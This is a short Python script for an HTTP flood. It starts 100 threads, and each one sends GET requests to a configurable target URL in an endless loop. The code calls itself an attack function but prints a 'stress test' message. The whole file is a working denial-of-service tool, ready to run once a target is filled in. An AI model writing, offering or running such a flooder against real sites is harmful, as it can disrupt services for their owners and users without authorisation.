import threading
import requests
import time

# --- Configuration ---
TARGET_URL = "http://example.com"  # Replace with your target URL
NUM_THREADS = 100                  # Number of concurrent threads
REQUEST_DELAY = 0.1                # Delay between requests in seconds

# --- Attack Function ---
def attack_target():
    """
    Function executed by each thread. Continuously sends HTTP GET requests to the target.
    """
    while True:
        try:
            # Send a GET request to the target URL
            response = requests.get(TARGET_URL)
            print(f"Request sent! Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            # Handle connection errors (e.g., server down or unreachable)
            print(f"Request failed: {e}")
        
        # Optional: Add a small delay to control the request rate per thread
        time.sleep(REQUEST_DELAY)

# --- Main Execution ---
if __name__ == "__main__":
    print(f"Starting stress test on {TARGET_URL} with {NUM_THREADS} threads...")
    
    threads = []
    
    # Create and start threads
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=attack_target)
        thread.daemon = True  # Allows threads to close when the main program exits
        threads.append(thread)
        thread.start()
    
    # Keep the main thread alive to let child threads run
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping attack...")